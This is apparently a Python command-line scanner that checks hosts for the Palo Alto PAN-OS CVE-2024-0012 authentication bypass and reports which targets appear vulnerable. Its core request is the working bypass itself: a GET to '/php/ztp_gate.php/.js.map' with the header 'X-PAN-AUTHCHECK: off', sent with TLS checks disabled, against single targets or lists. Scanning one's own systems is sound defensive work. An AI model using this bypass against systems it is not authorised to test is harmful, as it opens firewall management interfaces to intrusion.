import requests
import urllib3
import argparse
import re
from rich.console import Console
from rich.table import Table

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()


def is_reachable(base_url):
    """
    Check if the target is reachable.

    Parameters:
        base_url (str): The base URL of the target.

    Returns:
        bool: True if reachable, False otherwise.
    """
    try:
        response = requests.head(base_url, verify=False, timeout=5)
        return response.status_code in {200, 301, 302, 401}
    except requests.RequestException:
        return False


def check_palo_alto_vulnerability(base_url):
    """
    Checks for Palo Alto PAN-OS CVE-2024-0012 vulnerability.

    Parameters:
        base_url (str): The base URL of the Palo Alto Management Web Interface.

    Returns:
        dict: Results of the vulnerability check.
    """
    url = f"{base_url}/php/ztp_gate.php/.js.map"
    headers = {"X-PAN-AUTHCHECK": "off"}

    try:
        response = requests.get(url, headers=headers, verify=False, timeout=10)
        if response.status_code == 200:
            # Check script accessibility by testing specific PHP resources
            script_access_check = requests.get(
                url,
                headers=headers,
                verify=False,
                timeout=10
            )
            has_accessible_scripts = (
                script_access_check.status_code == 200
                and "Zero Touch Provisioning" in script_access_check.text
            )

            # Check general markers
            contains_scripts = bool(re.search(r"/php/|/js/lib/", response.text))
            contains_phpsessid = "PHPSESSID" in response.headers.get("Set-Cookie", "")

            # Refined logic: Vulnerable if scripts are actually accessible
            is_vulnerable = has_accessible_scripts

            return {
                "vulnerable": is_vulnerable,
                "url": url,
                "status_code": response.status_code,
                "headers": dict(response.headers),
                "has_accessible_scripts": has_accessible_scripts,
                "contains_scripts": contains_scripts,
                "contains_phpsessid": contains_phpsessid,
            }
        elif "Login" in response.text or "loginscreen_logo" in response.text:
            return {"vulnerable": False, "message": "System redirects to login, no access granted."}
        else:
            return {"vulnerable": False, "message": "No markers indicating vulnerability."}
    except requests.RequestException as e:
        return {"error": str(e)}


def print_results(results):
    """
    Prints detailed results for a single vulnerability check.

    Parameters:
        results (dict): Results of the vulnerability check.
    """
    if "error" in results:
        console.print(f"[bold red]Error:[/bold red] {results['error']}")
        return

    if results.get("vulnerable"):
        console.print("[bold red][!] Target -appears- vulnerable![/bold red]\n")
        table = Table(title="Vulnerability Details", show_header=True, header_style="bold magenta")
        table.add_column("Key", justify="right", style="cyan", no_wrap=True)
        table.add_column("Value", style="white")

        table.add_row("URL", results["url"])
        table.add_row("Status Code", str(results["status_code"]))
        table.add_row("Headers", str(results["headers"]))
        table.add_row("Accessible Scripts", "Yes" if results["has_accessible_scripts"] else "No")
        table.add_row("Body Contains Scripts", "Yes" if results["contains_scripts"] else "No")
        table.add_row("Contains PHPSESSID", "Yes" if results["contains_phpsessid"] else "No")

        console.print(table)
    else:
        console.print("[bold green][+] Target does not appear to be vulnerable.[/bold green]")
        if "message" in results:
            console.print(f"Message: {results['message']}")


def summarize_results(results_list):
    """
    Summarizes the results of vulnerability checks for multiple targets.

    Parameters:
        results_list (list): List of results from vulnerability checks.
    """
    summary_table = Table(title="Vulnerability Summary", show_header=True, header_style="bold magenta")
    summary_table.add_column("Target", justify="left", style="cyan", no_wrap=True)
    summary_table.add_column("Status", style="white")

    for target, result in results_list:
        if result.get("error"):
            status = "[bold yellow]Unreachable[/bold yellow]"
        else:
            status = "[bold red]Vulnerable[/bold red]" if result.get("vulnerable") else "[bold green]Not Vulnerable[/bold green]"
        summary_table.add_row(target, status)

    console.print(summary_table)


def get_input_targets():
    """
    Prompts the user for interactive input if no arguments are provided.

    Returns:
        list: List of targets entered by the user.
    """
    targets = []
    while True:
        target = input("Enter an FQDN or IP (leave blank to finish): ").strip()
        if not target:
            break
        targets.append(target)
    return targets


def main():
    """
    Main entry point for the script.
    """
    parser = argparse.ArgumentParser(description="Check for Palo Alto PAN-OS CVE-2024-0012 vulnerability.")
    parser.add_argument("-t", "--target", help="Target FQDN or IP")
    parser.add_argument("-f", "--file", help="File containing a list of targets (one per line)")
    parser.add_argument("-d", "--details", action="store_true", help="Print detailed results for vulnerable targets")

    args = parser.parse_args()

    targets = []
    if args.target:
        targets.append(args.target)

    if args.file:
        try:
            with open(args.file, "r") as file:
                targets.extend(line.strip() for line in file if line.strip())
        except FileNotFoundError:
            console.print(f"[bold red]Error: File '{args.file}' not found.[/bold red]")
            return

    if not targets:
        targets = get_input_targets()

    if not targets:
        console.print("[bold red]No targets to check. Exiting.[/bold red]")
        return

    results_list = []

    for target in targets:
        console.print(f"[bold cyan]Checking target:[/bold cyan] {target}")
        target_url = f"https://{target}"
        if not is_reachable(target_url):
            results_list.append((target, {"error": "Target unreachable"}))
            continue
        results = check_palo_alto_vulnerability(target_url)
        results_list.append((target, results))

    summarize_results(results_list)

    # Filter vulnerable results
    vulnerable_results = [result for target, result in results_list if result.get("vulnerable")]

    if args.details:
        if vulnerable_results:
            for target, results in results_list:
                if results.get("vulnerable"):
                    print_results(results)
        else:
            console.print("[bold yellow]No vulnerable targets to show details for.[/bold yellow]")
    elif not (args.target or args.file):
        if vulnerable_results:
            show_details = input("Do you want to see details for vulnerable targets? (y/n): ").strip().lower()
            if show_details == "y":
                for target, results in results_list:
                    if results.get("vulnerable"):
                        print_results(results)
        else:
            console.print("[bold yellow]No vulnerable targets detected.[/bold yellow]")


if __name__ == "__main__":
    main()